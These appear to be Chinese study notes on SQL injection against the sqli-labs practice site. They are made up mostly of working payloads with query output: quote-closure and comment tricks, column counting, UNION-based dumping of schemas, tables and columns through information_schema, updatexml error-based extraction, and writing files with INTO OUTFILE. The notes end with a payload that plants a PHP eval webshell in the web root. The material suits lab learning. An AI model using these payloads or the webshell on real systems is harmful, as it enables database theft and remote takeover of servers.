```sql
SELECT * FROM users WHERE id='1' and 1=2 '' LIMIT 0,1 -- 错误
/*这两个连续的''在此是不合法的，它无法被解析，正确的命令应该是再加一个and，他就可以被解析*/
SELECT * FROM users WHERE id='1' and 1=2 and '' LIMIT 0,1 --正确
```

```sql
/*--作为注释符时，后边需要加任意空格和一个任意字符才可以作注释，而浏览器往往在传参的时候会忽略这个空格，因此--作为注释符被sql解析*/
-- 这是正确的
http://192.168.6.171:81/Less-1/?id=1' and 1=2 -- q
http://192.168.6.171:81/Less-1/?id=1' and 1=2 --+
-- 这是错误的
http://192.168.6.171:81/Less-1/?id=1' and 1=2 --q
http://192.168.6.171:81/Less-1/?id=1' and 1=2 --_(_代表一个空格)
```

```sql
SELECT * FROM users WHERE id=1 union select 1,2,3;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | Dumb     | Dumb     |
|  1 | 2        | 3        |
+----+----------+----------+
-- 联合查询在sql中的结果是返回原始查询和联合查询共同的结果集。

/*但是在浏览器中回显的时候一般要看后端脚本怎么将结果回显到浏览器上，一般都只会通过$row = mysql_fetch_array($result)函数返回结果集的第一个结果，即DUMB和DUMB，而不是DUMB2和DUMB3。*/

SELECT * FROM users WHERE id=1 union select 1,2,3 LIMIT 1,1;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | 2        | 3        |
+----+----------+----------+
-- 但是可以通过LIMIT a,b来限制结果集结果，其中a代表偏移量，b代表显示几行，最后将显示原先结果集中第a行以后的共b行结果。
-- 或者用group_concat()函数来使得结果集合并为一行，但是这样可能会因为浏览器的显示字符有限而使得显示不全
SELECT * FROM users WHERE id='' union select 1,group_concat(id),3 from users;
+----+-------------------------------+----------+
| id | username                      | password |
+----+-------------------------------+----------+
|  1 | 1,2,3,4,5,6,7,8,9,10,11,12,14 | 3        |
+----+-------------------------------+----------+
```



sql中字符串必须用''框起来

uniont select前后是两个逻辑，他们之间没有与或非的关系

```sql
SELECT * FROM users WHERE id=1 and 1=2 union select 1,2,3;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | 2        | 3        |
+----+----------+----------+
-- 这里id=1虽然存在但是由于和1=2进行了and，所以没有id=1的结果
SELECT * FROM users WHERE id=1 union select 1,2,3;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | Dumb     | Dumb     |
|  1 | 2        | 3        |
+----+----------+----------+
-- 这里没有用and因为有id=1的结果
```

```sql
-- 判断是否有注入
-- 挨着尝试 无闭合，''闭合，""闭合，('')闭合，("")闭合，((''))闭合，((""))闭合；然后加上and 1=1和and 1=2看是否存在注入，如果第一个返回原始查询，第二个返回空结果(不一定会不会报错，但是肯定和第一个结果不一样）则证明存在该闭合注入，否则不好说。


-- 判断列数（row,也即字段数）
-- 判断列数是为了后边联合查询结果和原始查询结果列保持一致，否则会报错
-- 从1开始尝试，到报错为止即为列数（不报错证明存在第n列）
select * from users where id=1 order by 1;

-- 联合查询查看所有库
select * from users where id=1 union select 1,schema_name,3 from information_schema.schemata;
-- 联合查询查看当前库（联合查询担当了select关键字的任务，否则单纯的一个databaes()是不会返回当前库名的
select * from users where id=1 union select 1,database(),3;

-- 联合查询查看当前库中的所有表
select * from users where id=1 union select 1,table_name,3 from information_schema.tables where table_schema="某库名（或者为当前库名database()）";

-- 联合查询查看当前表中所有的列(注意同时过滤表名和库名，否则可能会有同名列)
select * from users where id=1 union select 1,column_name,3 from information_schema.columns where table_schema="schema-name" and table_name="table-name";

-- 其实拿到表名后就可以配合LIMIT查看该表所有数据了
-- 或者拿到列名后之查看部分数据
select * from users where id=1 union select 1,row1-name,row2-name from table-name;


--将数据写入文件
select 1,2,3 into outfile "/path/to/write"; 
```







没有回显的sql注入方法（即数据库不会将查询结果显式的表现出来）

此时就需要通过报错注入或者盲注的方法。

报错注入：无显式回显的不代表有报错注入，输入了错误的内容（比如and 1=2）导致了报错也不代表会有报错注入，得用updatexml()尝试才知道有没有报错注入。

```sql
select * from users where id=1；
-- 返回的sql查询结果是
|  1 | Dumb     | Dumb     |
-- 但是这三个任何一个列的结果都不会显示在浏览器上（即可能后端拿着这个数据干了别的事，只返回了成功或失败），这就是无显式的回显。
```

```sql
-- 原始查询
select * from users where id='1'；
-- 使用updatexml报错查询，它和联合查询不同，不需要关心字段数等，一般搭配AND和OR使用
-- ###特别注意的是，mysql机制中，如果and前的条件不成立，则压根不会执行and后边的条件；同样的，如果OR前面的成立了，则也压根不会执行OR后边的条件。
-- ###还有一点要注意，concat中间是要加括号的，而且要加完整的命令
select * from users where id='1' and updatexml(1, concat(0x7e, (select database()), 0x7e), 3);
select * from users where id='1' and updatexml(1, concat('~', (select database()), '~'), 3);
-- 但是报错一般有长度限制,
```

写webshell，写反弹shell（写马）

```sql
select * from users where id=1 union select 1,'<?php eval($_REQUEST[cmd]) ?>',3 into outfile '/var/www/html/php_name.php';
```

